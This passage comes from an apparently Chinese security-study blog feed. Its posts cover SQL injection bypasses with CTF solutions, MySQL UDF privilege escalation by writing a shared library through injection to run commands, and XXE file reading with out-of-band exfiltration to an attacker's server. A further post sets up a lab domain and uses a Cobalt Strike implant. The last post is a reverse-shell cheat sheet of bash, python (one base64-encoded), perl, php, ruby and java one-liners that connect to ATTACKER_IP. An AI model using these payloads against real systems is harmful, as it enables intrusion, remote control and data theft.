<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from users) as a;</span><br></pre></td></tr></table></figure>

<p>我们在查询时from后面要有一个名称，而我们上述的作用就是将()里的子查询命名为a，这样才可以查询到3的列。</p>
<p><img src="/posts/28db1d4e/1755779795987-2b836469-186d-410a-8628-c68584e7ceb6.png" alt="img"></p>
<p>4.当&#96;被waf掉时，我们可以使用别名的方法绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from users) as a;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/28db1d4e/1755779938560-96748aac-d69d-46ef-8844-fafb1232dd37.png" alt="img"></p>
<p>5.查询多个列时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(`2`,0x3a,`3`) from (select 1,2,3 union select * from users)a;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/28db1d4e/1755780185203-f5c03698-58ac-4dd2-ac44-97e0fe08090c.png" alt="img"></p>
<h2 id="一道CTF题目"><a href="#一道CTF题目" class="headerlink" title="一道CTF题目"></a>一道CTF题目</h2><h3 id="SWPU2019-Web11"><a href="#SWPU2019-Web11" class="headerlink" title="[SWPU2019]Web11"></a>[SWPU2019]Web11</h3><p>参考<a href="https://blog.csdn.net/satasun/article/details/109391116">https://blog.csdn.net/satasun/article/details/109391116</a></p>
<p>注入点是在广告名位置上</p>
<p>1.注释符被过滤，使用  ‘ 直接进行闭合</p>
<p>2.空格被过滤，使用&#x2F;**&#x2F;绕过。</p>
<p>3.or被过滤，information使用不了，查表名可以使用<code>select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()</code>。然后使用上述方法就可以得到flag。</p>
<p><img src="/posts/28db1d4e/1755780998903-cc7f1eee-464e-43e6-b1f7-0bdf6d5f2e2d.png" alt="img"></p>
<p>列数为22，爆出数据库。</p>
<p><img src="/posts/28db1d4e/1755781116194-acc26cb8-6f7b-4669-a058-f92bd01da578.png" alt="img"></p>
<p>爆出表名</p>
<p>最后payload（users表的列数为3哈）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>



<p><img src="/posts/28db1d4e/1755782545400-0d78cf71-4292-4787-97d1-8aac4aecc682.png" alt="img"></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
  </entry>
  <entry>
    <title>udf提权</title>
    <url>/posts/b320f10d/</url>
    <content><![CDATA[<p>学习文章：<a href="https://www.sqlsec.com/2020/11/mysql.html#UDF-%E6%8F%90%E6%9D%83">https://www.sqlsec.com/2020/11/mysql.html#UDF-%E6%8F%90%E6%9D%83</a></p>
<p>基本概念：自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="动态连接库"><a href="#动态连接库" class="headerlink" title="动态连接库"></a>动态连接库</h3><p>如果是MySQL &gt;&#x3D; 5.1的版本，必须把UDF的动态链接库文件放置于Mysql安装目录下的lib\plugin文件夹下才能创建自定义函数，</p>
<p>sqlmap和Metasploit里都自带了对应系统的动态链接库文件</p>
<ul>
<li>sqlmap的UDF动态链接库文件位置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/sqlmap/data/udf/mysql</span><br></pre></td></tr></table></figure>

<p><img src="/posts/b320f10d/1763012169213-f55ca764-8fef-46ff-afba-f574c0fb8bd1.png" alt="img"></p>
<p>sqlmap自带的udf动态链接库因为防止被误杀，都带着编码，不过它也给出了编码工具 cloak.py </p>
<p><img src="/posts/b320f10d/1763012367245-55516617-5d8d-422e-9313-b07e520c0add.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwd                                                               </span><br><span class="line">/usr/share/sqlmap/extra/cloak</span><br><span class="line"></span><br><span class="line"># 解码 32 位的 Linux 动态链接库</span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"></span><br><span class="line"># 解码 64 位的 Linux 动态链接库</span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br><span class="line"></span><br><span class="line"># 解码 32 位的 Windows 动态链接库</span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br><span class="line"></span><br><span class="line"># 解码 64 位的 Windows 动态链接库</span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure>

<ul>
<li>Metasploit中的udf动态链接库就不过多赘述了，它的文件内容其实和sqlmap的动态链接库文件内容一样，只不过是未经编码的，具体可看一下国光师傅的文章</li>
</ul>
<h3 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h3><p>使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">+-------------------------------+----------------------------------------------------+</span><br><span class="line">| Variable_name                 | Value                                              |</span><br><span class="line">+-------------------------------+----------------------------------------------------+</span><br><span class="line">| default_authentication_plugin | mysql_native_password                              |</span><br><span class="line">| plugin_dir                    | D:\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin\ |</span><br><span class="line">+-------------------------------+----------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>如果不存在可以找到mysql安装目录，然后手动创建\lib\plugin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 233 into dumpfile &#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;;</span><br></pre></td></tr></table></figure>

<p>找mysql的安装目录的命令是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| @@basedir                               |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| D:\phpstudy_pro\Extensions\MySQL5.7.26\ |</span><br><span class="line">+-----------------------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h3><h4 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h4><p><strong>条件</strong>：SQL注入且是高权限，plugin目录可写且需要secure_file_priv无限制，MySQL插件目录可以被MySQL用户写入，这时就可以直接使用sqlmap来上传动态链接库，又因为get方法又字节限制，所以往往要使用POST方法</p>
<p>命令就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost:30008/&quot; \</span><br><span class="line">--data=&quot;id=1&quot;  \</span><br><span class="line">--file-write=&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot; \//动态连接库的位置</span><br><span class="line">--file-dest=&quot;/usr/lib/mysql/plugin/udf.so&quot; //要写入的位置</span><br></pre></td></tr></table></figure>

<h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>如果没有注入的话我们可以操作原生sql语句，但是必须时 secure_file_priv无限制的时候，可以手动写文件到plugin目录下：</p>
<p>可以直接向plugin目录下写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 直接 SELECT 查询十六进制写入</span><br><span class="line">SELECT 0x7f454c4602... INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br><span class="line"></span><br><span class="line"># 解码十六进制再写入多此一举</span><br><span class="line">SELECT unhex(&#x27;7f454c4602...&#x27;) INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure>

<p>16进制的由来是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 直接传入路径编码</span><br><span class="line">SELECT hex(load_file(&#x27;/lib_mysqludf_sys_64.so&#x27;));</span><br><span class="line"></span><br><span class="line"># 也可以将路径 hex 编码</span><br><span class="line">SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));</span><br><span class="line">//我的命令是</span><br><span class="line">select hex(load_file(&#x27;D:\\Desktop\\lib_mysqludf_sys_32.dll&#x27;));</span><br></pre></td></tr></table></figure>

<p><img src="/posts/b320f10d/1763015122799-a5da6b8b-f248-4b9a-84fa-6603a2e98f74.png" alt="img"></p>
<p>也可以导入到文件里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select hex(load_file(&#x27;D:\\Desktop\\lib_mysqludf_sys_32.dll&#x27;)) into dumpfile &#x27;D:\\Desktop\\4.txt&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/b320f10d/1763015256164-a53ebad6-449a-405b-b5ea-507cb65fc050.png" alt="img"></p>
<p>然后就执行上面那条命令写入到目标服务器就行</p>
<p><img src="/posts/b320f10d/1763015621377-87f3405a-3fba-4983-9fb3-2b150928fa8a.png" alt="img"></p>
<h3 id="创建自定义函数并执行命令"><a href="#创建自定义函数并执行命令" class="headerlink" title="创建自定义函数并执行命令"></a>创建自定义函数并执行命令</h3><p>导入sys_eval函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure>

<p>查看是否导入成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/b320f10d/1763016096043-8a5bfcb2-00ea-400a-b9c8-1cb3cd59dd24.png" alt="img"></p>
<p>注意点：我之前导入的是32位然后发现不行后来尝试64位成功了。</p>
<p><img src="/posts/b320f10d/1763016229503-62f6246b-d842-4f4e-bdd7-b54604df05e3.png" alt="img"></p>
<p>删除自定义函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop function sys_eval;</span><br></pre></td></tr></table></figure>



<h2 id="一道ctf题目"><a href="#一道ctf题目" class="headerlink" title="一道ctf题目"></a>一道ctf题目</h2><h3 id="SWPUCTF-2025-秋季新生赛-sql仅仅只是sql吗？"><a href="#SWPUCTF-2025-秋季新生赛-sql仅仅只是sql吗？" class="headerlink" title="[SWPUCTF 2025 秋季新生赛]sql仅仅只是sql吗？"></a>[SWPUCTF 2025 秋季新生赛]sql仅仅只是sql吗？</h3><p>sqlmap可以一把梭</p>
<p>然后也可以手动注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union SELECT 1,2,group_concat( VARIABLE_VALUE) FROM information_schema.GLOBAL_VARIABLES WHERE variable_name = &#x27;secure_file_priv&#x27;</span><br></pre></td></tr></table></figure>

<p>查看是否配置可用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,2,group_concat(VARIABLE_VALUE) from information_schema.GLOBAL_VARIABLES where VARIABLE_NAME like &#x27;plugin%&#x27;</span><br></pre></td></tr></table></figure>

<p>查看 plugin  的位置</p>
<p>但是需要注意的是，因为传参方式是GET传参，GET传参对于长度有限制，所以我们需要分段传入。 这里用的办法是，先创建一个表，将十六进制一点点插入进表里的字段，然后将字段里的值写进文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建一个sqludf表，里面有一个longblob数据类型的data字段</span><br><span class="line">1;CREATE TABLE sqludf(data longblob);</span><br><span class="line"></span><br><span class="line"># 将十六进制的so文件传进该字段</span><br><span class="line">1;INSERT INTO sqludf(data) VALUES (0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000);</span><br><span class="line"></span><br><span class="line"># 在该字段后追加数据</span><br><span class="line">1;UPDATE sqludf SET data=CONCAT(data,0x181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e574640400000064120000000000006412000000000000);</span><br><span class="line"></span><br><span class="line"># 。。。。。。（不断截取，将整个文件传进去）</span><br><span class="line"></span><br><span class="line"># 将十六进制写进so文件</span><br><span class="line">1;SELECT data FROM sqludf INTO DUMPFILE &#x27;/usr/lib/mariadb/plugin/rce.so&#x27;;</span><br><span class="line"></span><br><span class="line"># 创建sys_exec方法</span><br><span class="line">1;CREATE FUNCTION sys_exec RETURNS int SONAME &#x27;rce.so&#x27;;</span><br><span class="line"></span><br><span class="line"># 执行命令</span><br><span class="line">1 union SELECT 1,2,sys_exec(&#x27;env&#x27;);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
  </entry>
  <entry>
    <title>xxe漏洞</title>
    <url>/posts/91285e0e/</url>
    <content><![CDATA[<h2 id="XXE简介"><a href="#XXE简介" class="headerlink" title="XXE简介"></a>XXE简介</h2><h3 id="xxe漏洞原理"><a href="#xxe漏洞原理" class="headerlink" title="xxe漏洞原理"></a>xxe漏洞原理</h3><p>未对外部实体进行限制，导致攻击者将代码插入到xml文件中，服务器读取xml恶意文件，形成外部实体注入，产生文件任意读取，命令执行，ssrf等漏洞。</p>
<h3 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h3><p>XML 指可扩展标记语言（eXtensible Markup Language）。</p>
<p>XML 被设计用来传输和存储数据，不用于表现和展示数据，HTML 则用来表现数据。</p>
<p>在xml中对实体的引入的方法是：<foo>&xxe;</foo></p>
<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。payload存在的位置</p>
<p>DTD的格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; 内部实体的声明</span><br><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt; 外部实体的声明</span><br></pre></td></tr></table></figure>

<p>对于外部实体是可以使用php伪协议和file伪协议的，实现文件的任意读取等漏洞</p>
<h2 id="xxe漏洞利用（有无回显）"><a href="#xxe漏洞利用（有无回显）" class="headerlink" title="xxe漏洞利用（有无回显）"></a>xxe漏洞利用（有无回显）</h2><h3 id="题目名称-NCTF-2019-Fake-XML-cookbook"><a href="#题目名称-NCTF-2019-Fake-XML-cookbook" class="headerlink" title="题目名称[NCTF 2019]Fake XML cookbook"></a>题目名称[NCTF 2019]Fake XML cookbook</h3><h4 id="有回显的做法"><a href="#有回显的做法" class="headerlink" title="有回显的做法"></a>有回显的做法</h4><p><img src="/posts/91285e0e/1750295141694-011615f1-b5c0-42f6-ba21-48dbb8935ac2.png" alt="img"></p>
<p>这里我们抓到提交包之后很明显是xxe漏洞，因此我们构造一下payload</p>
<p><img src="/posts/91285e0e/1750295357234-253e2e28-7a35-437e-8c9c-60dd28686f3e.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;</span><br><span class="line">&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>



<h4 id="无回显的做法"><a href="#无回显的做法" class="headerlink" title="无回显的做法"></a>无回显的做法</h4><p>启动apache服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start apache2</span><br></pre></td></tr></table></figure>

<p>在&#x2F;var&#x2F;www&#x2F;html 创建一个文件evil.xml</p>
<p>内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://你的vps ip/?content=%file;&#x27;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/91285e0e/1750296676317-b6d85492-f079-4478-abf3-4fbf21e0a8bd.png" alt="img"></p>
<p>bp这边交payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://your-vps-ip/evil.xml&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;</span><br><span class="line">123&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>使用实体dtd访问evil.xml文件，使用payload实体，到”http:&#x2F;&#x2F;你的vps ip&#x2F;?content&#x3D;%file;“部分调用file实体读取flag并外带出来。</p>
<p><img src="/posts/91285e0e/1750296801335-66e12566-a305-45b5-8354-5735524aebc5.png" alt="img"></p>
<p>得到的部分base64解码就可以了</p>
<p><img src="/posts/91285e0e/1750296915493-9bf6d78a-b876-4bd2-bbae-c5de703cc47b.png" alt="img"></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
  </entry>
  <entry>
    <title>内网-单域搭建</title>
    <url>/posts/682bd3d6/</url>
    <content><![CDATA[<h1 id="单域搭建"><a href="#单域搭建" class="headerlink" title="单域搭建"></a>单域搭建</h1><h2 id="第一步：更改用户名关闭防火墙（方便实验）"><a href="#第一步：更改用户名关闭防火墙（方便实验）" class="headerlink" title="第一步：更改用户名关闭防火墙（方便实验）"></a>第一步：更改用户名关闭防火墙（方便实验）</h2><h2 id="第二步：配置静态ip地址和DNS"><a href="#第二步：配置静态ip地址和DNS" class="headerlink" title="第二步：配置静态ip地址和DNS"></a>第二步：配置静态ip地址和DNS</h2><p>我用了三台虚拟机，分别设置</p>
<p>DC机</p>
<p><img src="/posts/682bd3d6/1751971702475-066e7f00-e28d-4230-8e03-57dc08a9ab17-1751974812632-60.png" alt="img"></p>
<p>web机</p>
<p><img src="/posts/682bd3d6/1751971840887-f8b180fe-df03-45e8-bec0-89622b2425b5-1751974812632-64.png" alt="img"></p>
<p>pc机</p>
<p><img src="/posts/682bd3d6/1751958219535-5b31d3e5-c5c2-4cca-879b-d5cfa6be2498-1751974812632-62.png" alt="img"></p>
<h2 id="第三步：DC安装域控"><a href="#第三步：DC安装域控" class="headerlink" title="第三步：DC安装域控"></a>第三步：DC安装域控</h2><p><img src="/posts/682bd3d6/1751972165953-dba97d93-cfb0-4069-90bc-f0fb8bd21b4e-1751974781099-36.png" alt="img"></p>
<p><img src="/posts/682bd3d6/1751972159172-874ca244-f65b-42ff-a42c-8509e17f34e3-1751974781099-38.png" alt="img"></p>
<p>在这两个位置能够安装（按顺序来），因为我是安装过的，所以就不展示安装过程了</p>
<p><img src="/posts/682bd3d6/1751971946598-7f08e77c-0e6f-4212-a8d2-a22430958673-1751974781099-40.png" alt="img"></p>
<p>添加域名</p>
<h2 id="第四步：域内添加用户"><a href="#第四步：域内添加用户" class="headerlink" title="第四步：域内添加用户"></a>第四步：域内添加用户</h2><p><img src="/posts/682bd3d6/1751972239731-dff68c0c-4a6f-49f1-a5d0-92f2acaaf065-1751974781099-42.png" alt="img"></p>
<p>然后修改主机名称加入域</p>
<p>web机和pc机加入就行</p>
<p><img src="/posts/682bd3d6/1751972491615-3dadbb3f-1143-4317-9cd2-7e8a79ca4bc3-1751974781099-50.png" alt="img"></p>
<p>然后我们尝试使用 CobaltStrike4.7生成木马来连接主机</p>
<p><img src="/posts/682bd3d6/1751972759965-74cf9a02-8ffc-43b0-8bef-8e7467579f2a-1751974781099-44.png" alt="img"></p>
<p><img src="/posts/682bd3d6/1751973016882-7494fcac-e1d5-47b4-8b36-c9172210d532-1751974781099-46.png" alt="img"></p>
<p>连接后生成一个木马，让web机或者pc机运行木马即可</p>
<p><img src="/posts/682bd3d6/1751972983540-aae22c54-84f3-4e71-a634-80f1a5a5b003-1751974781099-48.png" alt="img"></p>
<p>连接成功并执行命令</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
  </entry>
  <entry>
    <title>反弹shell</title>
    <url>/posts/2f610211/</url>
    <content><![CDATA[<p>这里记录一下反弹shell的方法，方便以后的使用</p>
<p>参考<a href="https://mp.weixin.qq.com/s/hTGuZ7kdh7K4mToGdbogvA">https://mp.weixin.qq.com/s/hTGuZ7kdh7K4mToGdbogvA</a></p>
<h2 id="基于bash-Terminal的反弹shell"><a href="#基于bash-Terminal的反弹shell" class="headerlink" title="基于bash&#x2F;Terminal的反弹shell"></a>基于bash&#x2F;Terminal的反弹shell</h2><ol>
<li>经典的TCP反弹</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<ol>
<li>使用文件描述符</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/ATTACKER_IP/PORT; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>

<ol>
<li>使用管道</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/f; /bin/sh -i &lt; /tmp/f 2&gt;&amp;1 | nc ATTACKER_IP PORT &gt; /tmp/f</span><br></pre></td></tr></table></figure>

<ol>
<li>UDP反弹</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/udp/ATTACKER_IP/PORT 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<ol>
<li>反弹到多个端口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1 &amp; bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<ol>
<li>bash反弹绕过</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.130/1234 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h2><ol>
<li>python2</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ATTACKER_IP&quot;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>

<ol>
<li>python3</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket();s.connect((&quot;ATTACKER_IP&quot;,PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<ol>
<li>python使用pty模块</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty, socket; s=socket.socket(); s.connect((&quot;ATTACKER_IP&quot;,PORT)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<ol>
<li>python单行编码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;exec(__import__(&#x27;base64&#x27;).b64decode(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIkFUVEFDS0VSX0lQIixQT1JUKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ==&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<h2 id="perl反弹shell"><a href="#perl反弹shell" class="headerlink" title="perl反弹shell"></a>perl反弹shell</h2><ol>
<li>经典的perl反弹</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;ATTACKER_IP&quot;;$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>

<p>2.perl简写版</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;ATTACKER_IP:PORT&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="PHP反弹shell"><a href="#PHP反弹shell" class="headerlink" title="PHP反弹shell"></a>PHP反弹shell</h2><ol>
<li>php fsockopen</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,PORT);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<ol>
<li>PHP socket_create</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,&quot;ATTACKER_IP&quot;,PORT);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>3.php反引号执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;system(&quot;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1\&#x27;&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Ruby反弹shell"><a href="#Ruby反弹shell" class="headerlink" title="Ruby反弹shell"></a>Ruby反弹shell</h2><ol>
<li>Ruby TCPSocket</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;ATTACKER_IP&quot;,&quot;PORT&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>

<ol>
<li>Ruby exec</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;ATTACKER_IP&quot;,&quot;PORT&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="java反弹shell"><a href="#java反弹shell" class="headerlink" title="java反弹shell"></a>java反弹shell</h2><ol>
<li>java Runtime.exec</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ATTACKER_IP/PORT;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br></pre></td></tr></table></figure>

<ol>
<li>java完整类</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ReverseShell &#123;    public static void main(String[] args) throws Exception &#123;        String[] cmd = &#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1&quot;&#125;;        Runtime.getRuntime().exec(cmd);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Powershell反弹shell"><a href="#Powershell反弹shell" class="headerlink" title="Powershell反弹shell"></a>Powershell反弹shell</h2><ol>
<li>PowerShell</li>
</ol>
